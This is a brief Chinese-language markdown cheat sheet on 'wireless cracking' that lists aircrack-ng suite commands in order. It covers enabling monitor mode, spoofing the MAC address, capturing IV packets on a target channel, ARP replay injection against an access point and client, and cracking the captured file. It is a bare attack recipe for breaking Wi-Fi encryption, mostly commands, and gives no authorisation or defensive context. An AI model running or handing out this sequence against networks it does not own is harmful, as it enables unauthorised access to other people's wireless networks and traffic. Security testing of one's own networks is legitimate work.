# 无线破解

[引用](http://netsecurity.51cto.com/art/201105/264844_all.htm)      感谢！
[简书](http://www.jianshu.com/p/fd16236057df)        感谢！

工具:  
**aircrack-ng全家桶: airmon-ng airodump-ng aireplay-ng aircrack-ng**  
[工具使用](https://www.path8.net/tn/archives/40)    感谢！

## 开启网卡监听模式  

> - airmon-ng start wlan0

## 改变网卡MAC  

> -macchanger -m 00:11:22:33:44:55 wlan0mon

## 扫描与抓包  

> - airodump-ng wlan0mon  
> - airodump-ng --ivs -w xxxx -c channel_num device 用于抓取特定频道的数据包以ivs文件保存  
> - aireplay-ng -3 -b AP'MAC -h Client'MAC device 用于使用ARP注入来产生大量数据包，配合airodump-ng使用  

## 解包

> - aircrack-ng xxxx.ivs  进行解包
